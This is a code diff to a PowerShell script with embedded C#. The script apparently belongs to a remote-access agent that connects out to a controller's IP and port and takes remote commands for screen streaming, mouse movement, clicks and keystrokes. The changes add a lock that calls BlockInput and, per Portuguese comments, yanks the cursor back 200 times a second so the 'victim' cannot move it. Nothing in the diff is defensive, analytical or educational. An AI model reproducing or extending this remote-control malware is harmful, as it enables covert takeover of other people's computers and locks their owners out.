@@ -41,7 +41,7 @@ if (-not ("R9KAgent" -as [type])) {
     public class R9KAgent {
         [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
         [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
-        [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt); // Trava mouse e teclado da vítima
+        [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
 
         static string IP;
         static int PORT;
@@ -52,7 +52,9 @@ if (-not ("R9KAgent" -as [type])) {
         static bool streaming = false;
         static object writeLock = new object();
 
-        static int targetX = -1, targetY = -1;
+        // Variáveis para a Trava de Mouse
+        static bool isLocked = false;
+        static int targetX = 0, targetY = 0;
         static bool hasNewPos = false;
 
         public static void Start(string ip, int port) {
@@ -95,15 +97,21 @@ if (-not ("R9KAgent" -as [type])) {
 
         static void InputLoop() {
             while (true) {
-                if (hasNewPos) {
-                    try {
-                        int px = (int)((targetX / 65535.0) * Screen.PrimaryScreen.Bounds.Width);
-                        int py = (int)((targetY / 65535.0) * Screen.PrimaryScreen.Bounds.Height);
-                        Cursor.Position = new Point(px, py);
-                    } catch {}
-                    hasNewPos = false;
-                }
-                Thread.Sleep(10); 
+                try {
+                    if (isLocked) {
+                        // Se está travado, força o cursor de volta pra posição que o controlador deixou
+                        if (Cursor.Position.X != targetX || Cursor.Position.Y != targetY) {
+                            Cursor.Position = new Point(targetX, targetY);
+                        }
+                    } else {
+                        // Se não está travado, apenas move normalmente
+                        if (hasNewPos) {
+                            Cursor.Position = new Point(targetX, targetY);
+                            hasNewPos = false;
+                        }
+                    }
+                } catch {}
+                Thread.Sleep(5); // Roda 200 vezes por segundo (impossível a vítima puxar o mouse)
             }
         }
 
@@ -125,13 +133,15 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "stream_stop") { streaming = false; Send("STREAM_STOPPED"); return; }
                 if (cmd == "exit") { BlockInput(false); Environment.Exit(0); }
                 
-                // TRAVA O MOUSE E O TECLADO DA VÍTIMA
                 if (cmd == "lock_mouse") {
+                    targetX = Cursor.Position.X; 
+                    targetY = Cursor.Position.Y;
+                    isLocked = true;
                     BlockInput(true); 
                     Send("MOUSE_LOCKED"); return;
                 }
-                // SOLTA O MOUSE E O TECLADO
                 if (cmd == "unlock_mouse") { 
+                    isLocked = false;
                     BlockInput(false); 
                     Send("MOUSE_UNLOCKED"); return; 
                 }
@@ -141,9 +151,11 @@ if (-not ("R9KAgent" -as [type])) {
 
                 if (cmd.StartsWith("move ")) {
                     string[] p = cmd.Split(' ');
-                    targetX = int.Parse(p[1]);
-                    targetY = int.Parse(p[2]);
-                    hasNewPos = true;
+                    int nx = int.Parse(p[1]);
+                    int ny = int.Parse(p[2]);
+                    targetX = (int)((nx / 65535.0) * Screen.PrimaryScreen.Bounds.Width);
+                    targetY = (int)((ny / 65535.0) * Screen.PrimaryScreen.Bounds.Height);
+                    hasNewPos = true; 
                 }
                 else if (cmd == "md 1") mouse_event(0x0002, 0, 0, 0, 0);
                 else if (cmd == "mu 1") mouse_event(0x0004, 0, 0, 0, 0);
